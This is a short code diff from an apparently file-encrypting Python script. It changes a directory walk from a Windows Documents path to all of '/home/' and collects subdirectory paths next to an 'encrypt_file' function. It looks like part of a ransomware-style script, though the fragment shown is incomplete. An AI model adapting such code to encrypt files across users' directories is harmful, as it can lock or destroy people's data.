@@ -52,7 +52,7 @@ def encrypt_file(name, key):
         print(str(e))
         pass
 
-for dirname, dirnames, filenames in os.walk('%homepath%/documents'):
+for dirname, dirnames, filenames in os.walk('/home/'):
     # print path to all subdirectories first.
     for subdirname in dirnames:
         dir_names.append(os.path.join(dirname, subdirname))
